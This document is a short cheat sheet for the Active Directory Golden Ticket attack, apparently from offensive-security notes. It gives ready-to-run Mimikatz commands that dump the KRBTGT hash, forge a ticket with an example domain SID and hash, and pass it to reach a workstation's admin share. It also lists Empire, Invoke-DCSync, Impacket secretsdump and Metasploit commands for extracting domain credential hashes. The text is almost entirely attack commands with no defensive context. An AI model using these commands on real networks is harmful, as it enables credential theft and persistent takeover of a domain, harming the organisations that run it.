# Golden Ticket

## Requirements: Domain Administrator Account or account with DCSync rights

## Essential information for the attack to work:

1) KRBTGT account NTLM hash

2) Domain SID

## Example Steps

### 1) Run Mimikatz

    privilege::debug

### 2) Dump information from the KRBTGT account to construct the golden ticket (Domain SID and NTLM Hash)

    lsadump::lsa /inject /name:krbtgt

### 3) Put it all together to create the golden ticket

    kerberos::golden /User:Administrator /domain:vuln.local /sid:S-1-5-21-2356823372-3609795904-2142328116 /krbtgt:ab20acb811769e025aba7d4fef487b96 /id:500 /ptt

### 4) Create a separate command line session using the Golden Ticket (Pass-the-Ticket)

    misc::cmd

### 5) With the newly created shell, we can run the command "dir" on a workstation on the network

    dir \\ws01\c$

## Alternate Method: Empire C2

    powershell/credentials/mimikatz/golden_ticket

## Methods of KRBTGT hash retrieval

### 1) Mimikatz

    lsadump::dcsync /domain:security.local /all
    lsadump::dcsync /domain:security.local /user:krbtgt
    lsadump::lsa /patch

### 2) Empire C2

    usemodule credentials/mimikatz/dcsync_hashdump

### 3) Invoke-DCSync

    Invoke-DCSync
    Invoke-DCSync -PWDumpFormat

### 4) Impacket Secretsdump

    secretsdump.py <Domain>/<Username>:<Password>@<Domain-Controller>

### 5) Metasploit

    use auxiliary/admin/smb/psexec_ntdsgrab
    use windows/gather/credentials/domain_hashdump
